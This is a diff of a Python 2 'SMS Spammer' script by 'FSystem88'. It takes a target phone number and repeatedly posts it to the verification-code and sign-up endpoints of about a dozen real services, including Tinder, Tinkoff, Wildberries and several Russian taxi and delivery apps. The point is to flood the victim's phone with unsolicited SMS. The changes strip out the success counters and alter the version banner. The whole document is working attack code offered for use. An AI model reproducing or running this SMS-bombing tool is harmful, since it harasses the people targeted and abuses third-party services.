@@ -1,8 +1,9 @@
+
 class spymer:
 	author = ''
 
 	def main(self):
-		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.2.0      8888\n8888888888888888888888888\n8888888888888888888888888\n'
+		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.1.5      8888\n8888888888888888888888888\n8888888888888888888888888\n'
 		import requests, datetime, sys, time, argparse
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
@@ -37,66 +38,19 @@ class spymer:
 		iteration = 0
 		_phone9 = _phone[1:]
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
+		print 'Spammer started.\n If you want to stop - press Ctrl+Z.'
 		i = 1
 		while i < 10:
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-			if grab.status_code == 200:
-				iteration += 1
-				print ('rgab good. number: {}').format(iteration)
-				sleep(5)
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-			if rutaxi == 668:
-				iteration += 1
-				print ('rutaxi good. number: {}').format(iteration)
-				sleep(5)
 			belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-			if belka.status_code == 200:
-				iteration += 1
-				print ('belka good. number: {}').format(iteration)
-				sleep(5)
 			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-			if tinder.status_code == 200:
-				iteration += 1
-				print ('tinder good. number: {}').format(iteration)
-				sleep(5)
 			vkusvill = requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={})
-			if vkusvill.status_code == 200:
-				iteration += 1
-				print ('vkusvill good! number: {}').format(iteration)
-				sleep(5)
 			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-			if karusel.status_code == 200:
-				iteration += 1
-				print ('karusel good! number: {}').format(iteration)
-				sleep(5)
 			uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
-			if uramobil.status_code == 200:
-				iteration += 1
-				print ('uramobil good! number: {}').format(iteration)
-				sleep(5)
 			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
-			if taxiseven.status_code == 200:
-				iteration += 1
-				print ('taxiseven good! number: {}').format(iteration)
-				sleep(5)
 			_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
 			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
-			if dostavista.status_code == 200:
-				iteration += 1
-				print ('dostavista good! number: {}').format(iteration)
-				sleep(5)
 			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-			if tinkoff.status_code == 200:
-				iteration += 1
-				print ('tinkoff good! number: {}').format(iteration)
-				sleep(5)
 			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
-			if worki.status_code == 200:
-				iteration += 1
-				print ('worki good! number: {}').format(iteration)
-				sleep(5)
 			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
-			if wildberries.status_code == 200:
-				iteration += 1
-				print ('wildberries good! number: {}').format(iteration)
-				sleep(5)
